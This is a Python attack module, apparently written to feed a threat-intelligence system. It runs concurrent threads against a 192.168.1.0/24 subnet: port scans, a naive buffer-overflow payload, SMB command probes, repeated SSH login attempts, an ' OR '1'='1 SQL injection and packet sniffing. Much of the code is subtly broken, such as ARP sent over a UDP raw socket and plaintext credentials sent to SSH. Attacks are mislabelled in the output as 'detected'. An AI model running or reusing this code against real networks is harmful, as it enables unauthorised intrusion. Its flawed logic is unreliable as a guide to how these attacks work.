import threading
import socket
import time
import random
import json
import requests
from datetime import datetime
import re
from scapy.all import sniff, IP, TCP, UDP, HTTPRequest
from scapy.layers.http import HTTPRequest

class AttackModule:
    def __init__(self, bnra_api_url="http://localhost:5000", target_ip="192.168.1.0/24"):
        self.api_url = bnra_api_url
        self.target_network = target_ip
        self.defense_module = BNRADefensiveIntel(bnra_api_url)
        self.running = False

    def start_attack_operations(self):
        self.running = True
        print("[ATTACK] Starting offensive operations...")

        threads = [
            threading.Thread(target=self.port_scan, daemon=True),
            threading.Thread(target=self.dns_enumeration, daemon=True),
            threading.Thread(target=self.network_discovery, daemon=True),
            threading.Thread(target=self.exploit_simulation, daemon=True),
            threading.Thread(target=self.data_exfiltration, daemon=True),
            threading.Thread(target=self.zero_day_attack, daemon=True),
            threading.Thread(target=self.phishing_simulation, daemon=True),
            threading.Thread(target=self.lateral_movement, daemon=True),
            threading.Thread(target=self.brute_force, daemon=True),
            threading.Thread(target=self.sql_injection, daemon=True),
            threading.Thread(target=self.real_time_monitoring, daemon=True)
        ]

        for thread in threads:
            thread.start()

        print("[ATTACK] Attack operations started")
        return True

    def port_scan(self):
        while self.running:
            try:
                for ip in self._generate_ips(self.target_network):
                    for port in range(1, 1025):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        result = sock.connect_ex((ip, port))
                        if result == 0:
                            self._submit_attack_intel(
                                ip,
                                port,
                                "open_port",
                                "port_scan"
                            )
                        sock.close()
            except Exception as e:
                print(f"[ATTACK] Port scan error: {e}")
            time.sleep(10)

    def _generate_ips(self, network):
        parts = network.split("/")
        cidr = int(parts[1])
        base_ip = parts[0]
        start_ip = int(base_ip.split(".")[3])
        end_ip = 2 ** (32 - cidr) - 1
        for i in range(start_ip, end_ip + 1):
            yield f"{base_ip.split('.')[0]}.{base_ip.split('.')[1]}.{base_ip.split('.')[2]}.{i}"

    def _submit_attack_intel(self, ip, port, indicator_type, source):
        intel_data = {
            "type": indicator_type,
            "indicators": [
                {
                    "type": "ip",
                    "value": ip,
                    "threat": "open_port"
                },
                {
                    "type": "port",
                    "value": port,
                    "threat": "open_port"
                }
            ],
            "confidence": 80,
            "source": source,
            "timestamp": datetime.now().isoformat()
        }
        self.defense_module.submit_threat_intel(intel_data)

    def dns_enumeration(self):
        while self.running:
            try:
                for ip in self._generate_ips(self.target_network):
                    domain = f"{ip}.local"
                    ip_result = socket.gethostbyname(domain)
                    if ip_result == ip:
                        self._submit_attack_intel(
                            ip,
                            53,
                            "dns_query",
                            "dns_enumeration"
                        )
            except Exception as e:
                print(f"[ATTACK] DNS enumeration error: {e}")
            time.sleep(15)

    def network_discovery(self):
        while self.running:
            try:
                for ip in self._generate_ips(self.target_network):
                    arp_request = b"\x00\x01\x08\x00\x06\x04\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("udp"))
                    sock.sendto(arp_request, (ip, 0))
                    response, addr = sock.recvfrom(1024)
                    if response:
                        self._submit_attack_intel(
                            ip,
                            2,
                            "arp_response",
                            "network_discovery"
                        )
            except Exception as e:
                print(f"[ATTACK] Network discovery error: {e}")
            time.sleep(10)

    def exploit_simulation(self):
        while self.running:
            try:
                for ip in self._generate_ips(self.target_network):
                    for port in [21, 22, 80, 443, 3389, 5985]:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        if result == 0:
                            self._submit_attack_intel(
                                ip,
                                port,
                                "vulnerable_service",
                                "exploit_simulation"
                            )
                        sock.close()
            except Exception as e:
                print(f"[ATTACK] Exploit simulation error: {e}")
            time.sleep(15)

    def data_exfiltration(self):
        while self.running:
            try:
                for ip in self._generate_ips(self.target_network):
                    response = requests.get(f"http://{ip}:80/data", timeout=2)
                    if response.status_code == 200:
                        self._submit_attack_intel(
                            ip,
                            80,
                            "data_exfiltration",
                            "data_exfiltration"
                        )
            except Exception as e:
                print(f"[ATTACK] Data exfiltration error: {e}")
            time.sleep(20)

    def zero_day_attack(self):
        while self.running:
            try:
                for ip in self._generate_ips("192.168.1.0/24"):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((ip, 80))
                    payload = b"A" * 1024
                    sock.send(payload)
                    response = sock.recv(1024)
                    if b"Segmentation fault" in response:
                        self.defense_module.submit_threat_intel({
                            "type": "zero_day",
                            "indicators": [{"type": "ip", "value": ip, "threat": "buffer_overflow"}],
                            "confidence": 95,
                            "source": "zero_day_attack"
                        })
                        print(f"[ZERO-DAY] Zero-day attack detected on {ip}")
            except Exception as e:
                print(f"[ZERO-DAY] Error: {e}")
            time.sleep(5)

    def phishing_simulation(self):
        while self.running:
            try:
                for ip in self._generate_ips("192.168.1.0/24"):
                    response = requests.get(f"http://{ip}:80/phishing.html", timeout=2)
                    if response.status_code == 200:
                        self.defense_module.submit_threat_intel({
                            "type": "phishing",
                            "indicators": [{"type": "ip", "value": ip, "threat": "phishing"}],
                            "confidence": 85,
                            "source": "phishing_simulation"
                        })
                        print(f"[PHISHING] Phishing attempt detected on {ip}")
            except Exception as e:
                print(f"[PHISHING] Error: {e}")
            time.sleep(10)

    def lateral_movement(self):
        while self.running:
            try:
                for ip in self._generate_ips("192.168.1.0/24"):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((ip, 445))
                    payload = b"\\Windows\\system32\\cmd.exe"
                    sock.send(payload)
                    response = sock.recv(1024)
                    if b"cmd.exe" in response:
                        self.defense_module.submit_threat_intel({
                            "type": "lateral_movement",
                            "indicators": [{"type": "ip", "value": ip, "threat": "lateral_movement"}],
                            "confidence": 90,
                            "source": "lateral_movement"
                        })
                        print(f"[LATERAL] Lateral movement detected on {ip}")
            except Exception as e:
                print(f"[LATERAL] Error: {e}")
            time.sleep(5)

    def brute_force(self):
        while self.running:
            try:
                for ip in self._generate_ips("192.168.1.0/24"):
                    for attempt in range(1, 100):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((ip, 22))
                        sock.send(f"test{attempt}\n".encode())
                        response = sock.recv(1024)
                        if b"Login successful" in response:
                            self.defense_module.submit_threat_intel({
                                "type": "brute_force",
                                "indicators": [{"type": "ip", "value": ip, "threat": "brute_force"}],
                                "confidence": 80,
                                "source": "brute_force"
                            })
                            print(f"[BRUTE] Brute force attack detected on {ip}")
                        sock.close()
            except Exception as e:
                print(f"[BRUTE] Error: {e}")
            time.sleep(10)

    def sql_injection(self):
        while self.running:
            try:
                for ip in self._generate_ips("192.168.1.0/24"):
                    response = requests.get(f"http://{ip}:80/sqli.php?user=admin' OR '1'='1", timeout=2)
                    if response.status_code == 200:
                        self.defense_module.submit_threat_intel({
                            "type": "sql_injection",
                            "indicators": [{"type": "ip", "value": ip, "threat": "sql_injection"}],
                            "confidence": 85,
                            "source": "sql_injection"
                        })
                        print(f"[SQL] SQL injection detected on {ip}")
            except Exception as e:
                print(f"[SQL] Error: {e}")
            time.sleep(5)

    def real_time_monitoring(self):
        while self.running:
            try:
                sniff(prn=self._analyze_packet, store=False)
            except Exception as e:
                print(f"[MONITOR] Error: {e}")
            time.sleep(5)

    def _analyze_packet(self, packet):
        if packet.haslayer(HTTPRequest):
            if "sql" in packet[HTTPRequest].path:
                self.defense_module.submit_threat_intel({
                    "type": "sql_injection",
                    "indicators": [{"type": "ip", "value": packet[IP].src, "threat": "sql_injection"}],
                    "confidence": 85,
                    "source": "real_time_monitoring"
                })
                print(f"[MONITOR] SQL injection detected from {packet[IP].src}")
        elif packet.haslayer(IP) and packet.haslayer(TCP):
            if packet[TCP].dport == 80:
                self.defense_module.submit_threat_intel({
                    "type": "http_traffic",
                    "indicators": [{"type": "ip", "value": packet[IP].src, "threat": "http_traffic"}],
                    "confidence": 80,
                    "source": "real_time_monitoring"
                })
                print(f"[MONITOR] HTTP traffic detected from {packet[IP].src}")
